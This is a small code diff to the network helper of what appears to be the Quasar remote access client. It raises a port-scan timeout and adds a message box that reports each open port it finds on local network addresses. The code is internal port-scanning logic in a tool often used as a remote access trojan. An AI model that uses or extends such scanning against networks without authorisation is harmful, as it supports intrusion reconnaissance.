@@ -12,6 +12,7 @@ using System.Threading.Tasks;
 using Quasar.Client.Networking;
 using System.Threading;
 using System.Security.Principal;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Helper.Network
 {
@@ -158,8 +159,8 @@ namespace Quasar.Client.Helper.Network
                                     NIC = entity,
                                     Address = networkEntity
                                 });
-                                if (IsPortOpen(currentIp, port, 100))
-                                {
+                                if (IsPortOpen(currentIp, port, 500))
+                                { 
                                     lock (ports)
                                     {
                                         ports.Add(port);
@@ -172,6 +173,7 @@ namespace Quasar.Client.Helper.Network
                                         Address = networkEntity,
                                         Interface = entity
                                     };
+                                    MessageBox.Show($"{currentIp} Found Port {port}");
                                     action(portPacket);
                                 }
                             }
